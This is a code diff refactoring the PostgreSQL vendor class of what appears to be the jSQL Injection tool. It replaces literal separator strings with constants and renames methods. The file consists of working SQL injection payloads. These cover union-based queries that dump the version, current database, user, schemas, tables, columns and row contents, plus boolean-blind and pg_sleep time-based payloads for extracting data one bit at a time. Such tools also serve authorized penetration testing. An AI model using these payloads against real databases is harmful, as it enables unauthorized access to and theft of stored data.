@@ -1,5 +1,10 @@
 package com.jsql.model.injection.vendor;
 
+import static com.jsql.model.accessible.DataAccess.QTE_SQL;
+import static com.jsql.model.accessible.DataAccess.SEPARATOR_SQL;
+import static com.jsql.model.accessible.DataAccess.TD_SQL;
+import static com.jsql.model.accessible.DataAccess.TRAIL_SQL;
+
 import java.util.ArrayList;
 import java.util.List;
 
@@ -10,19 +15,19 @@ import com.jsql.model.injection.strategy.Strategy;
 import com.jsql.model.injection.strategy.blind.ConcreteTimeInjection;
 import com.jsql.util.StringUtil;
 
-public class PostgreSQLVendor extends AbstractVendor {
+public class PostgreSQLVendor extends AbstractVendorDefault {
 
     @Override
     public String getSqlInfos() {
         return
             "concat_ws(" +
-                "'%04'," +
+                "'"+ SEPARATOR_SQL +"'," +
                 "version()," +
                 "current_database()," +
                 "user" +
             ")" +
             "||" +
-            "'%01%03%03%07'";
+            "'"+ TRAIL_SQL +"'";
     }
 
     @Override
@@ -30,11 +35,11 @@ public class PostgreSQLVendor extends AbstractVendor {
         return
             "select+array_to_string(array(" +
                 "select" +
-                    "'%04'||" +
+                    "'"+ SEPARATOR_SQL +"'||" +
                     "r||" +
-                    "'%05'||" +
+                    "'"+ QTE_SQL +"'||" +
                     "q::text||" +
-                    "'%04'" +
+                    "'"+ SEPARATOR_SQL +"'" +
                 "from(" +
                     "SELECT+" +
                         "tables.table_schema+r," +
@@ -44,9 +49,9 @@ public class PostgreSQLVendor extends AbstractVendor {
                     "group+by+r+" +
                     "order+by+r{limit}" +
                 ")x" +
-            "),'%06')" +
+            "),'"+ TD_SQL +"')" +
             "||" +
-            "'%01%03%03%07'";
+            "'"+ TRAIL_SQL +"'";
     }
 
     @Override
@@ -54,11 +59,11 @@ public class PostgreSQLVendor extends AbstractVendor {
         return
             "select+array_to_string(array(" +
                 "select" +
-                    "'%04'||" +
+                    "'"+ SEPARATOR_SQL +"'||" +
                     "r||" +
-                    "'%05'||" +
+                    "'"+ QTE_SQL +"'||" +
                     "q::text||" +
-                    "'%04'" +
+                    "'"+ SEPARATOR_SQL +"'" +
                 "from(" +
                     "SELECT+" +
                         "tables.table_name+r,'0'q+" +
@@ -67,9 +72,9 @@ public class PostgreSQLVendor extends AbstractVendor {
                     "where+tables.TABLE_SCHEMA='" + database.toString() + "'" +
                     "order+by+r{limit}" +
                 ")x" +
-            "),'%06')" +
+            "),'"+ TD_SQL +"')" +
             "||" +
-            "'%01%03%03%07'";
+            "'"+ TRAIL_SQL +"'";
     }
 
     @Override
@@ -77,11 +82,11 @@ public class PostgreSQLVendor extends AbstractVendor {
         return
             "select+array_to_string(array(" +
                 "select" +
-                    "'%04'||" +
+                    "'"+ SEPARATOR_SQL +"'||" +
                     "r||" +
-                    "'%05'||" +
+                    "'"+ QTE_SQL +"'||" +
                     "q::text||" +
-                    "'%04'" +
+                    "'"+ SEPARATOR_SQL +"'" +
                 "from(" +
                     "SELECT+" +
                         "columns.column_name+r,'0'q+" +
@@ -91,9 +96,9 @@ public class PostgreSQLVendor extends AbstractVendor {
                     "and+columns.TABLE_name='" + table.toString() + "'" +
                     "order+by+r{limit}" +
                 ")x" +
-            "),'%06')" +
+            "),'"+ TD_SQL +"')" +
             "||" +
-            "'%01%03%03%07'";
+            "'"+ TRAIL_SQL +"'";
     }
 
     @Override
@@ -104,11 +109,11 @@ public class PostgreSQLVendor extends AbstractVendor {
         return
             "select+array_to_string(array(" +
                 "select" +
-                    "'%04'||" +
+                    "'"+ SEPARATOR_SQL +"'||" +
                     "r||" +
-                    "'%05'||" +
+                    "'"+ QTE_SQL +"'||" +
                     "q::text||" +
-                    "'%04'" +
+                    "'"+ SEPARATOR_SQL +"'" +
                 "from(" +
                     "SELECT+" +
                         "substr((" + formatListColumn + "),1,775)r,count(*)q+" +
@@ -116,9 +121,9 @@ public class PostgreSQLVendor extends AbstractVendor {
                         "" + database + "." + table + "+" +
                     "group+by+r{limit}" +
                 ")x" +
-            "),'%06')" +
+            "),'"+ TD_SQL +"')" +
             "||" +
-            "'%01%03%03%07'";
+            "'"+ TRAIL_SQL +"'";
     }
     
     @Override
@@ -132,17 +137,17 @@ public class PostgreSQLVendor extends AbstractVendor {
     }
 
     @Override
-    public String getSqlBlindFirstTest() {
+    public String sqlTestBlindFirst() {
         return "0%2b1=1";
     }
 
     @Override
-    public String getSqlBlindCheck(String check) {
+    public String sqlTestBlind(String check) {
         return "+and+" + check + "--+";
     }
 
     @Override
-    public String getSqlBlindBitCheck(String inj, int indexCharacter, int bit) {
+    public String sqlBitTestBlind(String inj, int indexCharacter, int bit) {
         /**
          * true bit return bit, false bit return 0
          * 8 & 8 = 8, 8 & 4 = 0
@@ -151,27 +156,27 @@ public class PostgreSQLVendor extends AbstractVendor {
     }
 
     @Override
-    public String getSqlBlindLengthCheck(String inj, int indexCharacter) {
+    public String sqlLengthTestBlind(String inj, int indexCharacter) {
         return "+and+char_length(" + inj + ")>" + indexCharacter + "--+";
     }
 
     @Override
-    public String getSqlTimeCheck(String check) {
+    public String sqlTimeTest(String check) {
         return "+and+''=''||(select+CASE+WHEN+" + check + "+THEN''else+pg_sleep(" + ConcreteTimeInjection.SLEEP_TIME + ")END)--+";
     }
 
     @Override
-    public String getSqlTimeBitCheck(String inj, int indexCharacter, int bit) {
+    public String sqlBitTestTime(String inj, int indexCharacter, int bit) {
         return "+and+''=''||(select+CASE+WHEN+0!=(ascii(substr(" + inj + "," + indexCharacter + ",1))%26" + bit + ")+THEN''else+pg_sleep(" + ConcreteTimeInjection.SLEEP_TIME + ")END)--+";
     }
 
     @Override
-    public String getSqlTimeLengthCheck(String inj, int indexCharacter) {
+    public String sqlLengthTestTime(String inj, int indexCharacter) {
         return "+and+''=''||(select+CASE+WHEN+char_length(" + inj + ")>" + indexCharacter + "+THEN''else+pg_sleep(" + ConcreteTimeInjection.SLEEP_TIME + ")END)--+";
     }
 
     @Override
-    public String getSqlBlind(String sqlQuery, String startPosition) {
+    public String sqlBlind(String sqlQuery, String startPosition) {
         return
             /**
              * Enclosing '(' and ')' used for internal query, i.e [..]char_length((select ...))[..]
@@ -190,7 +195,7 @@ public class PostgreSQLVendor extends AbstractVendor {
     }
 
     @Override
-    public String getSqlTime(String sqlQuery, String startPosition) {
+    public String sqlTime(String sqlQuery, String startPosition) {
         return
             "(" +
                 "select+" +
@@ -216,7 +221,7 @@ public class PostgreSQLVendor extends AbstractVendor {
                     "(" + sqlQuery + ")," +
                     startPosition + "," +
                     "65536" +
-                "),'%01%03%03%07')";
+                "),'"+ TRAIL_SQL +"')";
     }
 
     @Override
